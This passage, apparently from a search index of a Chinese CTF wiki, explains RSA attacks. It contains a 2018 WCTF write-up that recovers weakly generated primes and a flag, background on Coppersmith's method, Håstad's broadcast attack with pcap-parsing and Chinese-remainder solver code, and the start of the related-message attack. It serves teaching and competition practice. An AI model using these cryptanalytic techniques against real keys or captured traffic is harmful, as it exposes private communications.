<<<320881698662242726122152659576060496538921409976895582875089953705144841691963343665651276480485795667557825130432466455684921314043200553005547236066163215094843668681362420498455007509549517213285453773102481574390864574950259479765662844102553652977000035769295606566722752949297781646289262341623549414376262470908749643200171565760656987980763971637167709961003784180963669498213369651680678149962512216448400681654410536708661206594836597126012192813519797526082082969616915806299114666037943718435644796668877715954887614703727461595073689441920573791980162741306838415524808171520369350830683150672985523901>>> admin public key: n = 483901264006946269405283937218262944021205510033824140430120406965422208942781742610300462772237450489835092525764447026827915305166372385721345243437217652055280011968958645513779764522873874876168998429546523181404652757474147967518856439439314619402447703345139460317764743055227009595477949315591334102623664616616842043021518775210997349987012692811620258928276654394316710846752732008480088149395145019159397592415637014390713798032125010969597335893399022114906679996982147566245244212524824346645297637425927685406944205604775116409108280942928854694743108774892001745535921521172975113294131711065606768927 e = 65537 Service: http://36.110.234.253 \u8fd9\u4e2a\u9898\u76ee\u73b0\u5728\u5df2\u7ecf\u6ca1\u6709\u529e\u6cd5\u5728\u7ebf\u83b7\u53d6 binary \u4e86\uff0c\u73b0\u5728\u5f97\u5230\u7684 binary \u662f\u4e4b\u524d\u5df2\u7ecf\u4e0b\u8f7d\u597d\u7684\uff0c\u6211\u4eec\u5f53\u65f6\u9700\u8981\u767b\u5f55\u7528\u6237\u7684 admin \u6765\u4e0b\u8f7d\u5bf9\u5e94\u7684 generator\u3002 \u901a\u8fc7\u7b80\u5355\u9006\u5411\u8fd9\u4e2a generator\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2a\u7a0b\u5e8f\u662f\u8fd9\u4e48\u5de5\u4f5c\u7684 \u5229\u7528\u7528\u6237\u7ed9\u5b9a\u7684 license\uff0832 \u4e2a\u5b57\u8282\uff09\uff0c\u8fed\u4ee3\u89e3\u5bc6\u67d0\u4e2a \u56fa\u5b9a\u4f4d\u7f6e \u4e4b\u540e\u7684\u6570\u636e\uff0c\u6bcf 32 \u4e2a\u5b57\u8282\u4e00\u7ec4\uff0c\u4e0e\u5bc6\u94a5\u76f8\u5f02\u6216\u5f97\u5230\u7ed3\u679c\u3002 \u5bc6\u94a5\u7684\u751f\u6210\u65b9\u6cd5\u4e3a k_1=key k_1=key k_2 =sha256(k_1) k_2 =sha256(k_1) ... k_n=sha256(k_{n-1}) k_n=sha256(k_{n-1}) \u5176\u4e2d\uff0c\u56fa\u5b9a\u4f4d\u7f6e\u5c31\u662f\u5728\u627e\u6e90\u6587\u4ef6 generator \u4e2d\u7b2c\u4e8c\u6b21\u51fa\u73b0 ENCRYPTED \u7684\u4f4d\u7f6e\uff0c\u7136\u540e\u518d\u6b21\u504f\u79fb 32 \u4e2a\u5b57\u8282\u3002 _ENCRYPT_STR = ENCRYPTED_STR ; v10 = 0 ; ENCRYPTED_LEN = strlen ( ENCRYPTED_STR ); do { do ++ v9 ; while ( strncmp ( & file_contents [ v9 ], _ENCRYPT_STR , ENCRYPTED_LEN ) ); ++ v10 ; } while ( v10 <= 1 ); v11 = & file_start_off_32 [ loc2 + ENCRYPTED_LEN ]; v12 = loc2 + ENCRYPTED_LEN ; len = file_size - ( loc2 + ENCRYPTED_LEN ) - 32 ; decrypt ( & file_start_off_32 [ v12 ], & license , len ); sha256_file_start ( v11 , len , & output ); if ( ! memcmp ( & output , & file_contents [ v12 ], 0x20 u ) ) { v14 = fopen ( \"out.exe\" , \"wb\" ); fwrite ( v11 , 1 u , len , v14 ); fclose ( v14 ); sprintf ( byte_406020 , \"out.exe %s \" , argv [ 1 ]); system ( byte_406020 ); } \u540c\u65f6\uff0c\u6211\u4eec\u9700\u8981\u786e\u4fdd\u751f\u6210\u7684\u6587\u4ef6\u7684\u6821\u9a8c\u5bf9\u5e94\u7684\u54c8\u5e0c\u503c\u6070\u597d\u4e3a\u6307\u5b9a\u7684\u503c\uff0c\u7531\u4e8e\u6587\u4ef6\u6700\u540e\u662f\u4e00\u4e2a exe \u6587\u4ef6\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u8ba4\u4e3a\u6700\u540e\u7684\u6587\u4ef6\u5934\u5c31\u662f\u6807\u51c6\u7684 exe \u6587\u4ef6\uff0c\u56e0\u6b64\u5c31\u4e0d\u9700\u8981\u77e5\u9053\u539f\u59cb\u7684 license \u6587\u4ef6\uff0c\u8fdb\u800c\u6211\u4eec\u53ef\u4ee5\u7f16\u5199 python \u811a\u672c\u751f\u6210 exe\u3002 \u5728\u751f\u6210\u7684 exe \u4e2d\uff0c\u6211\u4eec\u5206\u6790\u51fa\u7a0b\u5e8f\u7684\u57fa\u672c\u6d41\u7a0b\u4e3a \u8bfb\u53d6 license \u4f7f\u7528 license \u4f5c\u4e3a seed \u5206\u522b\u751f\u6210 pq \u5229\u7528 p\uff0cq \u751f\u6210 n\uff0ce\uff0cd\u3002 \u5176\u6f0f\u6d1e\u51fa\u73b0\u5728\u751f\u6210 p\uff0cq \u7684\u65b9\u6cd5\u4e0a\uff0c\u800c\u4e14\u751f\u6210 p \u548c q \u7684\u65b9\u6cd5\u7c7b\u4f3c\u3002 \u6211\u4eec\u5982\u679c\u4ed4\u7ec6\u5206\u6790\u4e0b\u751f\u6210\u7d20\u6570\u7684\u51fd\u6570\u7684\u8bdd\uff0c\u53ef\u4ee5\u770b\u5230\u6bcf\u4e2a\u7d20\u6570\u90fd\u662f\u5206\u4e3a\u4e24\u90e8\u5206\u751f\u6210\u7684 \u751f\u6210\u5de6\u534a\u90e8\u5206 512 \u4f4d\u3002 \u751f\u6210\u53f3\u534a\u90e8\u5206 512 \u4f4d\u3002 \u5de6\u53f3\u6784\u6210 1024 \u6bd4\u7279\u4f4d\uff0c\u5224\u65ad\u662f\u4e0d\u662f\u7d20\u6570\uff0c\u662f\u7d20\u6570\u5c31\u6210\u529f\uff0c\u4e0d\u662f\u7d20\u6570\uff0c\u7ee7\u7eed\u751f\u6210\u3002 \u5176\u4e2d\u751f\u6210\u6bcf\u90e8\u5206\u7684\u65b9\u5f0f\u76f8\u540c\uff0c\u65b9\u5f0f\u4e3a sha512 ( const1 | const2 | const3 | const4 | const5 | const6 | const7 | const8 | v9 ) v9 = r % 1000000007 \u53ea\u6709 v9 \u4f1a\u6709\u6240\u53d8\u5316\uff0c\u4f46\u662f\u5b83\u7684\u8303\u56f4\u5374\u662f\u56fa\u5b9a\u7684\u3002 \u90a3\u4e48\uff0c\u5982\u679c\u6211\u4eec\u8868\u793a p\uff0cq \u4e3a p=a*2^{512}+b p=a*2^{512}+b q=c*2^{512}+d q=c*2^{512}+d \u90a3\u4e48 n=pq=ac*2^{1024}+(ad+bc)*2^{512}+bd n=pq=ac*2^{1024}+(ad+bc)*2^{512}+bd \u90a3\u4e48 n \\equiv bd \\bmod 2^{512} n \\equiv bd \\bmod 2^{512} \u800c\u4e14\u7531\u4e8e p \u548c q \u5728\u751f\u6210\u65f6\uff0ca\uff0cb\uff0cc\uff0cd \u5747\u53ea\u6709 1000000007 \u79cd\u53ef\u80fd\u6027\u3002 \u8fdb\u800c\uff0c\u6211\u4eec\u53ef\u4ee5\u679a\u4e3e\u6240\u6709\u7684\u53ef\u80fd\u6027\uff0c\u9996\u5148\u8ba1\u7b97\u51fa b \u53ef\u80fd\u7684\u96c6\u5408\u4e3a S\uff0c\u540c\u65f6\u6211\u4eec\u4f7f\u7528\u4e2d\u95f4\u76f8\u9047\u653b\u51fb\uff0c\u8ba1\u7b97 n/d \\equiv b \\bmod 2^{512} n/d \\equiv b \\bmod 2^{512} \u8fd9\u91cc\u7531\u4e8e b \u548c d \u90fd\u662f p \u7684\u5c3e\u6570\uff0c\u6240\u4ee5\u4e00\u5b9a\u4e0d\u4f1a\u662f 2 \u7684\u500d\u6570\uff0c\u8fdb\u800c\u5fc5\u7136\u5b58\u5728\u9006\u5143\u3002 \u8fd9\u6837\u505a\u867d\u7136\u53ef\u4ee5\uff0c\u7136\u800c\uff0c\u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u7b97\u4e00\u4e0b\u5b58\u50a8\u7a7a\u95f4 64*1000000007 / 1024 / 1024 / 1024=59 64*1000000007 / 1024 / 1024 / 1024=59 \u4e5f\u5c31\u662f\u8bf4\u9700\u8981 59 G\uff0c\u592a\u5927\u4e86\uff0c\uff0c\u6240\u4ee5\u6211\u4eec\u4ecd\u7136\u9700\u8981\u8fdb\u4e00\u6b65\u8003\u8651 n \\equiv bd \\bmod 2^{64} n \\equiv bd \\bmod 2^{64} \u8fd9\u6837\uff0c\u6211\u4eec\u7684\u5185\u5b58\u9700\u6c42\u77ac\u95f4\u5c31\u964d\u5230\u4e86 8 G\u5de6\u53f3\u3002\u6211\u4eec\u4ecd\u7136\u4f7f\u7528\u679a\u4e3e\u7684\u65b9\u6cd5\u8fdb\u884c\u8fd0\u7b97\u3002 \u5176\u6b21\uff0c\u6211\u4eec\u4e0d\u80fd\u4f7f\u7528 python\uff0c\uff0cpython \u5360\u636e\u7a7a\u95f4\u592a\u5927\uff0c\u56e0\u6b64\u9700\u8981\u4f7f\u7528 c/c++ \u7f16\u5199\u3002 \u679a\u4e3e\u6240\u6709\u53ef\u80fd\u7684 d \u8ba1\u7b97\u5bf9\u5e94\u7684\u503c n/d n/d \u5982\u679c\u5bf9\u5e94\u7684\u503c\u5728\u96c6\u5408 S \u4e2d\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u8ba4\u4e3a\u627e\u5230\u4e86\u4e00\u5bf9\u5408\u6cd5\u7684 b \u548c d\uff0c\u56e0\u6b64\u6211\u4eec\u5c31\u53ef\u4ee5\u6062\u590d p \u548c q \u7684\u4e00\u534a\u3002 \u4e4b\u540e\uff0c\u6211\u4eec\u6839\u636e n-bd=ac*2^{1024}+(ad+bc)*2^{512} n-bd=ac*2^{1024}+(ad+bc)*2^{512} \u53ef\u4ee5\u5f97\u5230 \\frac{n-bd}{2^{512}} = ac*2^{512}+ad+bc \\frac{n-bd}{2^{512}} = ac*2^{512}+ad+bc \\frac{n-bd}{2^{512}} \\equiv ad+bc \\bmod 2^{512} \\frac{n-bd}{2^{512}} \\equiv ad+bc \\bmod 2^{512} \u7c7b\u4f3c\u5730\uff0c\u6211\u4eec\u53ef\u4ee5\u8ba1\u7b97\u51fa a \u548c c\uff0c\u4ece\u800c\u6211\u4eec\u5c31\u53ef\u4ee5\u5b8c\u5168\u6062\u590d\u51fa p \u548c q\u3002 \u5728\u5177\u4f53\u6c42\u89e3\u7684\u8fc7\u7a0b\u4e2d\uff0c\u5728\u6c42 p \u548c q \u7684\u4e00\u90e8\u5206\u65f6\uff0c\u53ef\u4ee5\u53d1\u73b0\u56e0\u4e3a\u662f\u6a21 2^{64} 2^{64} \uff0c\u6240\u4ee5\u53ef\u80fd\u5b58\u5728\u78b0\u649e\uff08\u4f46\u5176\u5b9e\u5c31\u662f\u4e00\u4e2a\u662f p\uff0c\u53e6\u5916\u4e00\u4e2a\u662fq\uff0c\u6070\u597d\u5bf9\u79f0\u3002\uff09\u3002\u4e0b\u9762\u6211\u4eec\u5c31\u6c42\u5f97\u4e86 b \u5bf9\u5e94\u7684 v9\u3002 \u6ce8\u610f\uff1a\u8fd9\u91cc\u679a\u4e3e\u51fa\u6765\u7684\u7a7a\u95f4\u5927\u7ea6\u5360\u7528 11 \u4e2a G\uff08\u5305\u62ec\u7d22\u5f15\uff09\uff0c\u6240\u4ee5\u8bf7\u9009\u62e9\u5408\u9002\u7684\u4f4d\u7f6e\u3002 b64: 9646799660ae61bd idx_b: 683101175 idx_d: 380087137 search 23000000 search 32000000 search 2b000000 search d000000 search 3a000000 search 1c000000 search 6000000 search 24000000 search 15000000 search 33000000 search 2c000000 search e000000 b64: 9c63259ccab14e0b idx_b: 380087137 idx_d: 683101175 search 1d000000 search 3b000000 search 7000000 search 16000000 search 25000000 search 34000000 \u5176\u5b9e\uff0c\u6211\u4eec\u5728\u771f\u6b63\u5f97\u5230 p \u6216\u8005 q \u7684\u4e00\u90e8\u5206\u540e\uff0c\u53e6\u5916\u4e00\u90e8\u5206\u5b8c\u5168\u53ef\u4ee5\u4f7f\u7528\u66b4\u529b\u679a\u4e3e\u7684\u65b9\u5f0f\u83b7\u53d6\uff0c\u56e0\u4e3a\u8ba1\u7b97\u91cf\u51e0\u4e4e\u90fd\u662f\u4e00\u6837\u7684\uff0c\u6700\u540e\u7ed3\u679c\u4e3a ... hash 7000000 hash 30000000 p = 13941980378318401138358022650359689981503197475898780162570451627011086685747898792021456273309867273596062609692135266568225130792940286468658349600244497842007796641075219414527752166184775338649475717002974228067471300475039847366710107240340943353277059789603253261584927112814333110145596444757506023869 q = 34708215825599344705664824520726905882404144201254119866196373178307364907059866991771344831208091628520160602680905288551154065449544826571548266737597974653701384486239432802606526550681745553825993460110874794829496264513592474794632852329487009767217491691507153684439085094523697171206345793871065206283 plain text 13040004482825754828623640066604760502140535607603761856185408344834209443955563791062741885 hash 16000000 hash 25000000 hash b000000 hash 34000000 hash 1 a000000 ... \u279c 2018 - WCTF - rsa git :( master ) \u2717 python Python 2.7.14 ( default , Mar 22 2018 , 14 : 43 : 05 ) [ GCC 4.2.1 Compatible Apple LLVM 9.0.0 ( clang - 900.0.39.2 )] on darwin Type \"help\" , \"copyright\" , \"credits\" or \"license\" for more information . >>> p = 13040004482825754828623640066604760502140535607603761856185408344834209443955563791062741885 >>> hex ( p )[ 2 :] . decode ( 'hex' ) Traceback ( most recent call last ): File \"<stdin>\" , line 1 , in < module > File \"/usr/local/Cellar/python@2/2.7.14_3/Frameworks/Python.framework/Versions/2.7/lib/python2.7/encodings/hex_codec.py\" , line 42 , in hex_decode output = binascii . a2b_hex ( input ) TypeError : Odd - length string >>> hex ( p )[ 2 : - 1 ] . decode ( 'hex' ) 'flag {fa6778724ed740396fc001b198f30313} ' \u6700\u540e\u6211\u4eec\u4fbf\u62ff\u5230 flag \u4e86\u3002 \u8be6\u7ec6\u7684\u5229\u7528\u4ee3\u7801\u8bf7\u53c2\u89c1 ctf-challenge \u4ed3\u5e93\u3002 \u76f8\u5173\u7f16\u8bd1\u6307\u4ee4\uff0c\u9700\u8981\u94fe\u63a5\u76f8\u5173\u7684\u5e93\u3002 g++ exp2.cpp -std = c++11 -o main2 -lgmp -lcrypto -pthread","title":"2018 WCTF RSA"},{"location":"crypto/asymmetric/rsa/rsa_complex/#_1","text":"https://upbhack.de/posts/wctf-2018-writeup-rsa/","title":"\u53c2\u8003"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/","text":"Coppersmith \u76f8\u5173\u653b\u51fb \u00b6 \u57fa\u672c\u539f\u7406 \u00b6 Coppersmith \u76f8\u5173\u653b\u51fb\u4e0e Don Coppersmith \u7d27\u5bc6\u76f8\u5173\uff0c\u4ed6\u63d0\u51fa\u4e86\u4e00\u79cd\u9488\u5bf9\u4e8e\u6a21\u591a\u9879\u5f0f\uff08\u5355\u53d8\u91cf\uff0c\u4e8c\u5143\u53d8\u91cf\uff0c\u751a\u81f3\u591a\u5143\u53d8\u91cf\uff09\u627e\u6240\u6709\u5c0f\u6574\u6570\u6839\u7684\u591a\u9879\u5f0f\u65f6\u95f4\u7684\u65b9\u6cd5\u3002 \u8fd9\u91cc\u6211\u4eec\u4ee5\u5355\u53d8\u91cf\u4e3a\u4e3b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u5047\u8bbe \u6a21\u6570\u4e3a N \uff0cN \u5177\u6709\u4e00\u4e2a\u56e0\u5b50 b\\geq N^{\\beta},0< \\beta \\leq 1 b\\geq N^{\\beta},0< \\beta \\leq 1 \u591a\u9879\u5f0f F \u7684\u6b21\u6570\u4e3a \\delta \\delta \u90a3\u4e48\u8be5\u65b9\u6cd5\u53ef\u4ee5\u5728 O(c\\delta^5log^9(N)) O(c\\delta^5log^9(N)) \u7684\u590d\u6742\u5ea6\u5185\u627e\u5230\u8be5\u591a\u9879\u5f0f\u6240\u6709\u7684\u6839 x_0 x_0 \uff0c\u8fd9\u91cc\u6211\u4eec\u8981\u6c42 |x_0|<cN^{\\frac{\\beta^2}{\\delta}} |x_0|<cN^{\\frac{\\beta^2}{\\delta}} \u3002 \u5728\u8fd9\u4e2a\u95ee\u9898\u4e2d\uff0c\u6211\u4eec\u7684\u76ee\u6807\u662f\u627e\u5230\u5728\u6a21 N \u610f\u4e49\u4e0b\u591a\u9879\u5f0f\u6240\u6709\u7684\u6839\uff0c\u8fd9\u4e00\u95ee\u9898\u88ab\u8ba4\u4e3a\u662f\u590d\u6742\u7684\u3002 Coppersmith method \u4e3b\u8981\u662f\u901a\u8fc7 Lenstra\u2013Lenstra\u2013Lov\u00e1sz lattice basis reduction algorithm \uff08LLL\uff09\u65b9\u6cd5\u627e\u5230 \u4e0e\u8be5\u591a\u9879\u5f0f\u5177\u6709\u76f8\u540c\u6839 x_0 x_0 \u66f4\u5c0f\u7cfb\u6570 \u5b9a\u4e49\u57df\u4e3a\u6574\u6570\u57df \u7684\u591a\u9879\u5f0f g\uff0c\u7531\u4e8e\u5728\u6574\u6570\u57df\u4e0a\u627e\u591a\u9879\u5f0f\u7684\u6839\u662f\u7b80\u5355\u7684\uff08Berlekamp\u2013Zassenhaus\uff09\uff0c\u4ece\u800c\u6211\u4eec\u5c31\u5f97\u5230\u4e86\u539f\u591a\u9879\u5f0f\u5728\u6a21\u610f\u4e49\u4e0b\u7684\u6574\u6570\u6839\u3002 \u90a3\u4e48\u95ee\u9898\u7684\u5173\u952e\u5c31\u662f\u5982\u4f55\u5c06 f \u8f6c\u6362\u5230 g \u5462\uff1fHowgrave-Graham \u7ed9\u51fa\u4e86\u4e00\u79cd\u601d\u8def \u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u9700\u8981\u627e\u5230\u4e00\u4e2a\u5177\u6709\u201c\u66f4\u5c0f\u7cfb\u6570\u201d\u7684\u591a\u9879\u5f0f g\uff0c\u4e5f\u5c31\u662f\u4e0b\u9762\u7684\u8f6c\u6362\u65b9\u5f0f \u5728 LLL \u7b97\u6cd5\u4e2d\uff0c\u6709\u4e24\u70b9\u662f\u975e\u5e38\u6709\u7528\u7684 \u53ea\u5bf9\u539f\u6765\u7684\u57fa\u5411\u91cf\u8fdb\u884c\u6574\u6570\u7ebf\u6027\u53d8\u6362\uff0c\u8fd9\u53ef\u4ee5\u4f7f\u5f97\u6211\u4eec\u5728\u5f97\u5230 g \u65f6\uff0c\u4ecd\u7136\u4ee5\u539f\u6765\u7684 x_0 x_0 \u4e3a\u6839\u3002 \u751f\u6210\u7684\u65b0\u7684\u57fa\u5411\u91cf\u7684\u6a21\u957f\u662f\u6709\u754c\u7684\uff0c\u8fd9\u53ef\u4ee5\u4f7f\u5f97\u6211\u4eec\u5229\u7528 Howgrave-Graham \u5b9a\u7406\u3002 \u5728\u8fd9\u6837\u7684\u57fa\u7840\u4e4b\u4e0a\uff0c\u6211\u4eec\u518d\u6784\u9020\u51fa\u591a\u9879\u5f0f\u65cf g \u5c31\u53ef\u4ee5\u4e86\u3002 \u5173\u4e8e\u66f4\u52a0\u7ec6\u8282\u7684\u5185\u5bb9\uff0c\u8bf7\u81ea\u884c\u641c\u7d22\u3002\u540c\u65f6\u8fd9\u90e8\u5206\u5185\u5bb9\u4e5f\u4f1a\u4e0d\u65ad\u66f4\u65b0\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u7531\u4e8e Coppersmith \u6839\u7684\u7ea6\u675f\uff0c\u5728 RSA \u4e2d\u7684\u5e94\u7528\u65f6\uff0c\u5f80\u5f80\u53ea\u9002\u7528\u4e8e e \u8f83\u5c0f\u7684\u60c5\u51b5\u3002 Basic Broadcast Attack \u00b6 \u653b\u51fb\u6761\u4ef6 \u00b6 \u5982\u679c\u4e00\u4e2a\u7528\u6237\u4f7f\u7528\u540c\u4e00\u4e2a\u52a0\u5bc6\u6307\u6570 e \u52a0\u5bc6\u4e86\u540c\u4e00\u4e2a\u5bc6\u6587\uff0c\u5e76\u53d1\u9001\u7ed9\u4e86\u5176\u4ed6 e \u4e2a\u7528\u6237\u3002\u90a3\u4e48\u5c31\u4f1a\u4ea7\u751f\u5e7f\u64ad\u653b\u51fb\u3002\u8fd9\u4e00\u653b\u51fb\u7531 H\u00e5stad \u63d0\u51fa\u3002 \u653b\u51fb\u539f\u7406 \u00b6 \u8fd9\u91cc\u6211\u4eec\u5047\u8bbe e \u4e3a 3\uff0c\u5e76\u4e14\u52a0\u5bc6\u8005\u4f7f\u7528\u4e86\u4e09\u4e2a\u4e0d\u540c\u7684\u6a21\u6570 n_1,n_2,n_3 n_1,n_2,n_3 \u7ed9\u4e09\u4e2a\u4e0d\u540c\u7684\u7528\u6237\u53d1\u9001\u4e86\u52a0\u5bc6\u540e\u7684\u6d88\u606f m\uff0c\u5982\u4e0b \\begin{align*} c_1&=m^3\\bmod n_1 \\\\ c_2&=m^3\\bmod n_2 \\\\ c_3&=m^3\\bmod n_3 \\end{align*} \\begin{align*} c_1&=m^3\\bmod n_1 \\\\ c_2&=m^3\\bmod n_2 \\\\ c_3&=m^3\\bmod n_3 \\end{align*} \u8fd9\u91cc\u6211\u4eec\u5047\u8bbe n_1,n_2,n_3 n_1,n_2,n_3 \u4e92\u7d20\uff0c\u4e0d\u7136\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u5206\u89e3\uff0c\u7136\u540e\u5f97\u5230 d\uff0c\u8fdb\u800c\u7136\u540e\u76f4\u63a5\u89e3\u5bc6\u3002 \u540c\u65f6\uff0c\u6211\u4eec\u5047\u8bbe m<n_i, 1\\leq i \\leq 3 m<n_i, 1\\leq i \\leq 3 \u3002\u5982\u679c\u8fd9\u4e2a\u6761\u4ef6\u4e0d\u6ee1\u8db3\u7684\u8bdd\uff0c\u5c31\u4f1a\u4f7f\u5f97\u60c5\u51b5\u53d8\u5f97\u6bd4\u8f83\u590d\u6742\uff0c\u8fd9\u91cc\u6211\u4eec\u6682\u4e0d\u8ba8\u8bba\u3002 \u65e2\u7136\u4ed6\u4eec\u4e92\u7d20\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406\uff0c\u53ef\u5f97 m^3 \\equiv C \\bmod n_1n_2n_3 m^3 \\equiv C \\bmod n_1n_2n_3 \u3002 \u6b64\u5916\uff0c\u65e2\u7136 m<n_i, 1\\leq i \\leq 3 m<n_i, 1\\leq i \\leq 3 \uff0c\u90a3\u4e48\u6211\u4eec\u77e5\u9053 m^3 < n_1n_2n_3 m^3 < n_1n_2n_3 \u5e76\u4e14 C<m^3 < n_1n_2n_3 C<m^3 < n_1n_2n_3 \uff0c\u90a3\u4e48 m^3 = C m^3 = C \uff0c\u6211\u4eec\u5bf9 C \u5f00\u4e09\u6b21\u6839\u5373\u53ef\u5f97\u5230 m \u7684\u503c\u3002 \u5bf9\u4e8e\u8f83\u5927\u7684 e \u6765\u8bf4\uff0c\u6211\u4eec\u53ea\u662f\u9700\u8981\u66f4\u591a\u7684\u660e\u5bc6\u6587\u5bf9\u3002 SCTF RSA3 LEVEL4 \u00b6 \u53c2\u8003 http://ohroot.com/2016/07/11/rsa-in-ctf \u3002 \u8fd9\u91cc\u6211\u4eec\u4ee5 SCTF RSA3 \u4e2d\u7684 level4 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u9996\u5148\u7f16\u5199\u4ee3\u7801\u63d0\u53d6 cap \u5305\u4e2d\u7684\u6570\u636e\uff0c\u5982\u4e0b #!/usr/bin/env python from scapy.all import * import zlib import struct PA = 24 packets = rdpcap ( './syc_security_system_traffic3.pcap' ) client = '192.168.1.180' list_n = [] list_m = [] list_id = [] data = [] for packet in packets: # TCP Flag PA 24 means carry data if packet [ TCP ] .flags == PA or packet [ TCP ] .flags == PA + 1 : src = packet [ IP ] .src raw_data = packet [ TCP ] .load head = raw_data.strip ()[ :7 ] if head == \"We have\" : n, e = raw_data.strip () .replace ( \"We have got N is \" , \"\" ) .split ( '\\ne is ' ) data.append ( n.strip ()) if head == \"encrypt\" : m = raw_data.replace ( 'encrypted messages is 0x' , '' ) .strip () data.append ( str ( int ( m, 16 ))) with open ( './data.txt' , 'w' ) as f: for i in range ( 0 , len ( data ) , 2 ) : tmp = ',' .join ( s for s in data [ i:i + 2 ]) f.write ( tmp + '\\n' ) \u5176\u6b21\uff0c\u5229\u7528\u5f97\u5230\u7684\u6570\u636e\u76f4\u63a5\u4f7f\u7528\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406\u6c42\u89e3\u3002 from functools import reduce import gmpy import json , binascii def modinv ( a , m ): return int ( gmpy . invert ( gmpy . mpz ( a ), gmpy . mpz ( m ))) def chinese_remainder ( n , a ): sum = 0 prod = reduce ( lambda a , b : a * b , n ) # \u5e76\u884c\u8fd0\u7b97 for n_i , a_i in zip ( n , a ): p = prod // n_i sum += a_i * modinv ( p , n_i ) * p return int ( sum % prod ) nset = [] cset = [] with open ( \"data.txt\" ) as f : now = f . read () . strip ( ' \\n ' ) . split ( ' \\n ' ) for item in now : item = item . split ( ',' ) nset . append ( int ( item [ 0 ])) cset . append ( int ( item [ 1 ])) m = chinese_remainder ( nset , cset ) m = int ( gmpy . mpz ( m ) . root ( 19 )[ 0 ]) print binascii . unhexlify ( hex ( m )[ 2 : - 1 ]) \u5f97\u5230\u5bc6\u6587\uff0c\u7136\u540e\u518d\u6b21\u89e3\u5bc6\u5373\u53ef\u5f97\u5230 flag\u3002 H1sTaDs_B40aDcadt_attaCk_e_are_same_and_smA9l \u9898\u76ee \u00b6 2017 WHCTF OldDriver 2018 N1CTF easy_fs Broadcast Attack with Linear Padding \u00b6 \u5bf9\u4e8e\u5177\u6709\u7ebf\u6027\u586b\u5145\u7684\u60c5\u51b5\u4e0b\uff0c\u4ecd\u7136\u53ef\u4ee5\u653b\u51fb\uff0c\u8fd9\u65f6\u5019\u5c31\u4f1a\u4f7f\u7528 Coppersmith method \u7684\u65b9\u6cd5\u4e86\uff0c\u8fd9\u91cc\u6682\u4e0d\u4ecb\u7ecd\u3002\u53ef\u4ee5\u53c2\u8003 https://en.wikipedia.org/wiki/Coppersmith%27s_attack#Generalizations Related Message Attack \u00b6 \u653b\u51fb\u6761\u4ef6 \u00b6 \u5f53 Alice \u4f7f\u7528\u540c\u4e00\u516c\u94a5\u5bf9\u4e24\u4e2a\u5177\u6709\u67d0\u79cd\u7ebf\u6027\u5173\u7cfb\u7684\u6d88\u606f M1 \u4e0e M2 \u8fdb\u884c\u52a0\u5bc6\uff0c\u5e76\u5c06\u52a0\u5bc6\u540e\u7684\u6d88\u606f C1\uff0cC2 \u53d1\u9001\u7ed9\u4e86 Bob \u65f6\uff0c\u6211\u4eec\u5c31\u53ef\u80fd\u53ef\u4ee5\u83b7\u5f97\u5bf9\u5e94\u7684\u6d88\u606f M1 \u4e0e M2\u3002\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u6a21\u6570\u4e3a N\uff0c\u4e24\u8005\u4e4b\u95f4\u7684\u7ebf\u6027\u5173\u7cfb\u5982\u4e0b M_1 \\equiv f(M_2) \\bmod N M_1 \\equiv f(M_2) \\bmod N \u5176\u4e2d f \u4e3a\u4e00\u4e2a\u7ebf\u6027\u51fd\u6570\uff0c\u6bd4\u5982\u8bf4 f=ax+b f=ax+b \u3002 \u5728\u5177\u6709\u8f83\u5c0f\u9519\u8bef\u6982\u7387\u4e0b\u7684\u60c5\u51b5\u4e0b\uff0c\u5176\u590d\u6742\u5ea6\u4e3a O(elog^2N) O(elog^2N) \u3002 \u8fd9\u4e00\u653b\u51fb\u7531 Franklin\uff0cReiter \u63d0\u51fa\u3002 \u653b\u51fb\u539f\u7406 \u00b6 \u9996\u5148\uff0c\u6211\u4eec\u77e5\u9053 C_1 \\equiv M_1 ^e \\bmod N C_1 \\equiv M_1 ^e \\bmod N \uff0c\u5e76\u4e14 M_1 \\equiv f(M_2) \\bmod N M_1 \\equiv f(M_2) \\bmod N \uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u77e5\u9053 M_2 M_2 \u662f f(x)^e \\equiv C_1 \\bmod N f(x)^e \\equiv C_1 \\bmod N \u7684\u4e00\u4e2a\u89e3\uff0c\u5373\u5b83\u662f\u65b9\u7a0b f(x)^e-C_1 f(x)^e-C_1 \u5728\u6a21 N \u610f\u4e49\u4e0b\u7684\u4e00\u4e2a\u6839\u3002\u540c\u6837\u7684\uff0c M_2 M_2 \u662f x^e - C_2 x^e - C_2 \u5728\u6a21 N \u610f\u4e49\u4e0b\u7684\u4e00\u4e2a\u6839\u3002\u6240\u4ee5\u8bf4 x-M_2 x-M_2 \u540c\u65f6\u6574\u9664\u4ee5\u4e0a\u4e24\u4e2a\u591a\u9879\u5f0f\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u6c42\u5f97\u4e24\u4e2a\u591a\u9879\u5f0f\u7684\u6700\u5927\u516c\u56e0\u5b50\uff0c\u5982\u679c\u6700\u5927\u516c\u56e0\u5b50\u6070\u597d\u662f\u7ebf\u6027\u7684\u8bdd\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u6c42\u5f97\u4e86 M_2 M_2 \u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728 e=3 e=3 \u7684\u60c5\u51b5\u4e0b\uff0c\u6700\u5927\u516c\u56e0\u5b50\u4e00\u5b9a\u662f\u7ebf\u6027\u7684\u3002 \u8fd9\u91cc\u6211\u4eec\u5173\u6ce8\u4e00\u4e0b e=3 e=3 \uff0c\u4e14 f(x)=ax+b f(x)=ax+b \u7684\u60c5\u51b5\u3002\u9996\u5148\u6211\u4eec\u6709 C_1 